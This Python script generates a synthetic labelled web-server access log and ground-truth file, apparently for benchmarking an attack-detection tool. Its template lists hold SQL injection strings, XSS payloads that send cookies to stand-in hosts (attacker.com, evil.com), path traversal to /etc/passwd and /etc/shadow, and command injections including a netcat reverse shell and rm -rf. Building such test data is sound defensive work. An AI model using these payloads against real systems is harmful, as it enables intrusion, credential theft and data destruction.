import os
import random
import json
import urllib.parse
from datetime import datetime, timezone, timedelta

def generate_large_labeled_dataset(
    output_path: str = "sample_data/large_benchmark_50k.log",
    labels_output_path: str = "sample_data/large_benchmark_50k_labels.json",
    total_records: int = 50000,
    attack_ratio: float = 0.10 # 10% attacks = 5,000 attacks, 45,000 benign
):
    print(f"Generating large dataset of {total_records:,} records ({int(attack_ratio*100)}% attacks)...")
    random.seed(42)

    base_time = datetime(2026, 7, 1, 0, 0, 0, tzinfo=timezone.utc)

    # 1. Benign Resources
    benign_paths = [
        "/", "/index.html", "/home", "/about-us", "/contact", "/team", "/careers",
        "/products", "/products/catalog", "/products/item?id={num}", "/products/details?sku={sku}",
        "/categories?cat=hardware", "/categories?cat=software", "/categories?cat=clothing",
        "/search?q={word}", "/search?query={word}&page={page}",
        "/static/css/bootstrap.min.css", "/static/css/theme.css", "/static/css/style.css",
        "/static/js/bundle.js", "/static/js/vendor.js", "/static/js/app.js", "/static/js/chart.min.js",
        "/assets/images/logo.png", "/assets/images/banner.jpg", "/assets/images/avatar{num}.png",
        "/favicon.ico", "/robots.txt", "/sitemap.xml",
        "/api/v1/health", "/api/v1/status", "/api/v1/metrics",
        "/api/v1/users/{num}", "/api/v1/articles?limit=10&offset={num}",
        "/blog/2026/01/introducing-cloud-security", "/blog/2026/02/soc-automation",
        "/cart/items", "/checkout/shipping", "/checkout/billing", "/orders/history",
        "/help/faq", "/help/terms", "/help/privacy", "/services/overview", "/pricing/enterprise"
    ]
    words = ["security", "dashboard", "network", "monitor", "firewall", "cloud", "server", "analytics", "database"]
    skus = ["SKU-1001", "SKU-2045", "SKU-9941", "SKU-3110", "SKU-8822"]
    
    benign_user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    ]
    
    benign_ips = [f"192.168.{random.randint(1, 10)}.{random.randint(1, 250)}" for _ in range(500)]
    benign_ips += [f"172.16.{random.randint(0, 5)}.{random.randint(1, 250)}" for _ in range(300)]
    benign_ips += [f"10.0.{random.randint(0, 10)}.{random.randint(1, 250)}" for _ in range(200)]

    # 2. Attack Payloads
    sqli_templates = [
        "/products?id=1' UNION SELECT username, password FROM users--",
        "/search?q=admin' OR 1=1--",
        "/items?cat=books'; DROP TABLE users;--",
        "/account?user=test' UNION SELECT null,table_name FROM information_schema.tables--",
        "/api/data?id=10 OR 1=1",
        "/login?u=admin' UNION SELECT 1,2,3--",
        "/item/view?id=5' WAITFOR DELAY '0:0:5'--",
        "/search?term=UNION SELECT password FROM accounts",
        "/query?val=1' AND 1=1--",
        "/view?doc=99 UNION SELECT id, credit_card FROM payments",
        "/catalog?ref=1 UNION SELECT schema_name FROM information_schema.schemata",
        "/members?id=-1 OR 1=1 ORDER BY 5--",
        "/order?ref=100; DROP TABLE audit_log;--"
    ]

    xss_templates = [
        "/search?q=<script>alert('XSS')</script>",
        "/comment?msg=<img src=x onerror=alert(document.cookie)>",
        "/profile?name=<svg onload=fetch('http://attacker.com/?c='+document.cookie)>",
        "/view?ref=<iframe src='javascript:alert(1)'>",
        "/search?keyword=<body onload=alert('XSS')>",
        "/feedback?text=<script src=http://evil.com/payload.js></script>",
        "/guestbook?msg=<script>document.location='http://evil.com?c='+document.cookie;</script>",
        "/test?p=<input onfocus=alert(1) autofocus>",
        "/item?tag=<details open ontoggle=alert(1)>",
        "/forum?title=<a href='javascript:alert(1)'>click me</a>",
        "/message?body=<script>prompt(1)</script>",
        "/users?bio=<script>confirm(document.domain)</script>"
    ]

    traversal_templates = [
        "/download?file=../../../../etc/passwd",
        "/include?page=../../../../etc/shadow",
        "/read?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/view?path=../../../../boot.ini",
        "/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/static/files/../../../../etc/passwd",
        "/get_doc?file=../../../../../../var/log/syslog",
        "/load?template=../../conf/server.xml",
        "/view_file?f=c:\\windows\\system32\\cmd.exe",
        "/assets/images/../../../etc/passwd",
        "/doc?path=../../../../windows/win.ini",
        "/stream?media=....//....//....//etc/group"
    ]

    cmd_templates = [
        "/tools/ping?target=127.0.0.1; cat /etc/passwd",
        "/tools/lookup?host=google.com|ls -la",
        "/status?node=main; id",
        "/backup?action=run && whoami",
        "/api/export?format=csv; uname -a",
        "/exec?cmd=cat /etc/passwd",
        "/check?ip=8.8.8.8; sleep 5",
        "/admin/diag?ip=10.0.0.1 | netstat -an",
        "/test?host=127.0.0.1; nc -e /bin/sh 10.0.0.1 4444",
        "/service/restart?svc=nginx; rm -rf /tmp/data",
        "/process?id=12; ps aux",
        "/util/run?job=test | ifconfig"
    ]

    dir_scan_paths = [
        "/.git/config", "/.git/HEAD", "/.env", "/.env.local", "/.env.production",
        "/.htaccess", "/admin", "/admin/login", "/admin/config.php", "/wp-admin",
        "/wp-login.php", "/backup.zip", "/backup.tar.gz", "/database.sql", "/dump.sql",
        "/phpmyadmin", "/pma", "/config.php.bak", "/server-status", "/web.config",
        "/actuator/health", "/swagger-ui.html", "/console", "/manager/html"
    ]

    attacker_ips = [
        "45.33.32.156", "185.220.101.5", "194.26.29.112", "91.240.118.23",
        "198.51.100.99", "203.0.113.88", "185.15.59.224", "103.251.167.20"
    ]

    total_attacks = int(total_records * attack_ratio)
    total_benign = total_records - total_attacks

    log_lines = []
    ground_truth = []

    # Generate Benign Records
    print(f"Generating {total_benign:,} benign requests...")
    for i in range(total_benign):
        t = base_time + timedelta(seconds=i * 0.5 + random.uniform(0, 0.4))
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        ip = random.choice(benign_ips)
        agent = random.choice(benign_user_agents)
        
        path_template = random.choice(benign_paths)
        endpoint = path_template.format(
            num=random.randint(1, 1000),
            sku=random.choice(skus),
            word=random.choice(words),
            page=random.randint(1, 10)
        )
        
        method = "POST" if ("/cart" in endpoint or "/checkout" in endpoint) and random.random() < 0.4 else "GET"
        status = 200
        if random.random() < 0.05:
            status = 304
        elif random.random() < 0.02:
            status = 404
        
        size = random.randint(300, 45000) if status == 200 else random.randint(100, 500)
        referrer = "https://example.com" if random.random() < 0.7 else "-"

        raw_line = f'{ip} - - [{ts_str}] "{method} {endpoint} HTTP/1.1" {status} {size} "{referrer}" "{agent}"'
        log_lines.append(raw_line)
        ground_truth.append({
            "line_number": len(log_lines),
            "label": "BENIGN",
            "category": "BENIGN",
            "ip": ip,
            "endpoint": endpoint
        })

    # Generate Attacks (Distributed in realistic attack campaigns)
    print(f"Generating {total_attacks:,} attack requests...")
    attack_categories = ["sqli", "xss", "path_traversal", "cmd_injection", "dir_enum", "brute_force"]
    per_cat = total_attacks // len(attack_categories)

    attack_records = []
    
    # 1. SQLi Campaign
    for i in range(per_cat):
        t = base_time + timedelta(minutes=random.randint(10, 300), seconds=random.uniform(0, 60))
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        ip = random.choice(attacker_ips[:3])
        payload = random.choice(sqli_templates)
        encoded_endpoint = urllib.parse.quote(payload, safe="/:?=&")
        raw = f'{ip} - - [{ts_str}] "GET {encoded_endpoint} HTTP/1.1" 500 512 "-" "sqlmap/1.7.8"'
        attack_records.append((raw, "ATTACK", "sqli", ip, payload))

    # 2. XSS Campaign
    for i in range(per_cat):
        t = base_time + timedelta(minutes=random.randint(10, 300), seconds=random.uniform(0, 60))
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        ip = random.choice(attacker_ips[1:4])
        payload = random.choice(xss_templates)
        encoded_endpoint = urllib.parse.quote(payload, safe="/:?=&")
        raw = f'{ip} - - [{ts_str}] "GET {encoded_endpoint} HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (Windows NT 10.0; Win64)"'
        attack_records.append((raw, "ATTACK", "xss", ip, payload))

    # 3. Path Traversal Campaign
    for i in range(per_cat):
        t = base_time + timedelta(minutes=random.randint(10, 300), seconds=random.uniform(0, 60))
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        ip = random.choice(attacker_ips[2:5])
        payload = random.choice(traversal_templates)
        raw = f'{ip} - - [{ts_str}] "GET {payload} HTTP/1.1" 403 256 "-" "curl/7.88.1"'
        attack_records.append((raw, "ATTACK", "path_traversal", ip, payload))

    # 4. Command Injection Campaign
    for i in range(per_cat):
        t = base_time + timedelta(minutes=random.randint(10, 300), seconds=random.uniform(0, 60))
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        ip = random.choice(attacker_ips[3:6])
        payload = random.choice(cmd_templates)
        encoded_endpoint = urllib.parse.quote(payload, safe="/:?=&")
        raw = f'{ip} - - [{ts_str}] "GET {encoded_endpoint} HTTP/1.1" 500 512 "-" "python-requests/2.31.0"'
        attack_records.append((raw, "ATTACK", "cmd_injection", ip, payload))

    # 5. Directory Enumeration Scans (Gobuster sweeps)
    dir_scanner_ip = "198.51.100.99"
    scan_start = base_time + timedelta(hours=2)
    for i in range(per_cat):
        t = scan_start + timedelta(seconds=i * 0.5)
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        path = dir_scan_paths[i % len(dir_scan_paths)]
        raw = f'{dir_scanner_ip} - - [{ts_str}] "GET {path} HTTP/1.1" 404 128 "-" "gobuster/3.2.0"'
        attack_records.append((raw, "ATTACK", "dir_enum", dir_scanner_ip, path))

    # 6. Brute Force Authentication Attacks (Hydra bursts)
    bf_ip = "203.0.113.88"
    bf_start = base_time + timedelta(hours=3)
    for i in range(per_cat):
        t = bf_start + timedelta(seconds=i * 0.8)
        ts_str = t.strftime("%d/%b/%Y:%H:%M:%S +0000")
        raw = f'{bf_ip} - - [{ts_str}] "POST /api/v1/login HTTP/1.1" 401 64 "-" "Hydra/9.5"'
        attack_records.append((raw, "ATTACK", "brute_force", bf_ip, "/api/v1/login"))

    # Interleave attacks into the log stream to simulate realistic production traffic
    print(f"Interleaving {len(attack_records):,} attacks across normal traffic stream...")
    step = len(log_lines) // (len(attack_records) + 1)
    
    final_logs = []
    final_ground_truth = []
    
    attack_idx = 0
    for i, line in enumerate(log_lines):
        final_logs.append(line)
        final_ground_truth.append(ground_truth[i])
        
        if attack_idx < len(attack_records) and i % step == 0:
            atk_raw, atk_lbl, atk_cat, atk_ip, atk_ep = attack_records[attack_idx]
            final_logs.append(atk_raw)
            final_ground_truth.append({
                "line_number": len(final_logs),
                "label": atk_lbl,
                "category": atk_cat,
                "ip": atk_ip,
                "endpoint": atk_ep
            })
            attack_idx += 1

    # Append any remaining attacks
    while attack_idx < len(attack_records):
        atk_raw, atk_lbl, atk_cat, atk_ip, atk_ep = attack_records[attack_idx]
        final_logs.append(atk_raw)
        final_ground_truth.append({
            "line_number": len(final_logs),
            "label": atk_lbl,
            "category": atk_cat,
            "ip": atk_ip,
            "endpoint": atk_ep
        })
        attack_idx += 1

    # Write files
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(final_logs) + "\n")
        
    with open(labels_output_path, "w", encoding="utf-8") as f:
        json.dump(final_ground_truth, f, indent=2)

    file_size_mb = os.path.getsize(output_path) / (1024 * 1024)
    print(f"Dataset generated successfully!")
    print(f"  - Total Lines:     {len(final_logs):,}")
    print(f"  - File Path:       {output_path} ({file_size_mb:.2f} MB)")
    print(f"  - Labels Path:     {labels_output_path}")
    print(f"  - Benign Records:  {sum(1 for g in final_ground_truth if g['label'] == 'BENIGN'):,}")
    print(f"  - Attack Records:  {sum(1 for g in final_ground_truth if g['label'] == 'ATTACK'):,}")
    return output_path, labels_output_path

if __name__ == "__main__":
    generate_large_labeled_dataset()
